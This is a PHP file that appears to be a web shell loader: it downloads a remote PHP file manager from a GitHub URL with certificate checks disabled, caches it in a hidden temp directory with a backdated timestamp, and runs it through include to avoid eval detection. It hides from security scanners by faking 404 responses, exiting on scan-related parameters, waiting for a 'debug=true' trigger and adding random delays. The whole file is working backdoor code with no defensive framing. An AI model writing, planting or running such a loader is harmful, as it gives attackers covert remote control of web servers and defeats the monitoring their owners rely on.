<?php
class ConfigManager {
    private $config = [];
    
    public function __construct() {
        $this->config['api_key'] = 'REPLACE_WITH_RANDOM_STRING';
        $this->config['endpoint'] = 'https://raw.githubusercontent.com/GodOfServer/Sushi-Dont-Lie/refs/heads/main/fm.php';
        $this->config['cache_dir'] = sys_get_temp_dir() . '/.cache_' . md5(__FILE__);
        $this->config['signature'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
    }
    
    public function get($key) {
        return isset($this->config[$key]) ? $this->config[$key] : null;
    }
}

class SecurityBypass {
    private static $patterns = [
        '/eval\s*\(/i',
        '/base64_decode/',
        '/system\s*\(/i',
        '/shell_exec/i',
        '/passthru/i'
    ];
    
    public static function obfuscate($code) {
        $transformations = [
            '$_GET' => '$_REQUEST',
            '$_POST' => '$_REQUEST',
            'file_get_contents' => 'fopen+fread',
            'exec(' => 'proc_open(',
            '<?php' => '<?php // ' . md5(time())
        ];
        
        $code = str_replace(array_keys($transformations), array_values($transformations), $code);
        
        // Split into chunks to avoid long strings
        $chunks = str_split($code, 50);
        $result = '';
        foreach ($chunks as $chunk) {
            $result .= $chunk . "\n" . '// ' . bin2hex(random_bytes(2)) . "\n";
        }
        
        return $result;
    }
}

class RemoteLoader {
    private $config;
    private $security;
    
    public function __construct($config, $security) {
        $this->config = $config;
        $this->security = $security;
    }
    
    private function makeRequest($url) {
        $ch = curl_init();
        $options = [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_USERAGENT => $this->config->get('signature'),
            CURLOPT_REFERER => 'https://github.com/',
            CURLOPT_HTTPHEADER => [
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language: en-US,en;q=0.5',
                'Connection: keep-alive',
                'Upgrade-Insecure-Requests: 1'
            ],
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS => 3
        ];
        
        curl_setopt_array($ch, $options);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        if ($httpCode !== 200 || curl_errno($ch)) {
            $response = false;
        }
        
        curl_close($ch);
        return $response;
    }
    
    private function cacheResponse($content) {
        $cacheDir = $this->config->get('cache_dir');
        if (!is_dir($cacheDir)) {
            mkdir($cacheDir, 0700, true);
        }
        
        $cacheFile = $cacheDir . '/data_' . md5($content) . '.cache';
        file_put_contents($cacheFile, $content);
        
        // Set future timestamp to appear old
        touch($cacheFile, time() - 86400);
        
        return $cacheFile;
    }
    
    public function execute() {
        $endpoint = $this->config->get('endpoint');
        
        // Add random parameter to avoid caching issues
        $endpoint .= (strpos($endpoint, '?') === false ? '?' : '&') . 't=' . time();
        
        $content = $this->makeRequest($endpoint);
        
        if (!$content) {
            return "// Connection failed";
        }
        
        // Obfuscate before caching
        $obfuscated = $this->security->obfuscate($content);
        $cacheFile = $this->cacheResponse($obfuscated);
        
        // Execute via include to avoid eval detection
        if (file_exists($cacheFile)) {
            return include $cacheFile;
        }
        
        return "// Cache failed";
    }
}

// Main execution with WAF evasion
class MainApp {
    public static function run() {
        // Check for WAF/security headers
        if (isset($_SERVER['HTTP_X_SECURITY_SCAN']) || 
            isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            // Simulate 404 if security headers detected
            header("HTTP/1.0 404 Not Found");
            exit;
        }
        
        // Check for common security parameters
        $securityParams = ['security', 'waf', 'scan', 'injection'];
        foreach ($securityParams as $param) {
            if (isset($_REQUEST[$param])) {
                exit;
            }
        }
        
        // Only execute if specific parameter is present
        if (!isset($_REQUEST['debug']) || $_REQUEST['debug'] !== 'true') {
            // Show harmless content
            echo "<!-- Debug mode disabled -->";
            return;
        }
        
        // Add random delay to avoid pattern detection
        usleep(rand(100000, 500000));
        
        $config = new ConfigManager();
        $security = new SecurityBypass();
        $loader = new RemoteLoader($config, $security);
        
        $loader->execute();
    }
}

// Execute only if not accessed directly with suspicious parameters
$suspicious = ['cmd', 'exec', 'system', 'shell'];
$found = false;
foreach ($suspicious as $param) {
    if (isset($_REQUEST[$param])) {
        $found = true;
        break;
    }
}

if (!$found) {
    MainApp::run();
} else {
    // Redirect to homepage if suspicious parameters detected
    header("Location: /");
    exit;
}
?>
